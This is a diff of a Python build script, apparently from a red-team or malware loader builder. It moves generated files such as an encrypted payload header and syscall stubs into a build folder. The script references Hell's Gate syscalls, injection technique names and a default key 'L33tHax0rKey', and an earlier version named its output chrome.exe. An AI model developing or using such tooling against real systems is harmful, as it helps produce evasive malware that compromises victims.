@@ -3,27 +3,18 @@
 import os
 import subprocess
 import glob
-import sys
 import argparse
 import time
 import random
-from common import (
-    to_c_array,
-    encrypt_key,
-    encode_encrypted_payload,
-    open_payload,
-    write_header,
-    write_syscalls,
-)
-
-
+from common.crypto import *
+from common.encoder import *
+from common.helper import *
 def clean():
     
 
-    files_to_remove = [
-        "chrome.exe",
-        "src/modules/data/data.h",
-        "src/modules/syscall/syscalls.h",
+    files_to_remove = glob.glob("build/*.exe") + [
+        "build/data.h",
+        "build/syscalls.h",
     ]
     for f in files_to_remove:
         if os.path.exists(f):
@@ -68,7 +59,7 @@ def build_project(
     # Resource file compilation
     # /////////////////////////////////////////////
     # Handle resource file
-    rc_file = os.path.join("src", "modules", "meta", "meta.rc")
+    rc_file = os.path.join("meta", "meta.rc")
     res_file = None
     if os.path.exists(rc_file):
         res_file = os.path.splitext(rc_file)[0] + ".o"
@@ -93,6 +84,7 @@ def build_project(
             "-ffunction-sections",
             "-fdata-sections",
             "-fno-inline",
+            "-Ibuild",
             "-O2",
             "-Os",
             "-Wno-unused-variable",
@@ -222,7 +214,7 @@ Examples:
     # /////////////////////////////////////////////
     # Encryption key setup and validation
     # /////////////////////////////////////////////
-    output_header = os.path.join("src", "modules", "data", "data.h")
+    output_header = os.path.join("build","data.h")
     key = args.key
     if args.key == parser.get_default("key"):
         print("No key specified, key 'L33tHax0rKey' was used")
@@ -312,13 +304,13 @@ Examples:
     # Final build process execution
     # /////////////////////////////////////////////
     folder = os.path.join("src")
-    output_name = f"{args.output}.exe"
+    output_name = os.path.join("build", f"{args.output}.exe")
     use_hellsgate = args.technique in [
         "default",
         "eb",
         "hypnosis" 
     ]
-    write_syscalls("src\\modules\\syscall\\syscalls.h")
+    write_syscalls("build\\syscalls.h")
     build_project(folder, output_name, flags=compile_flags, use_hellsgate=use_hellsgate)
 
 
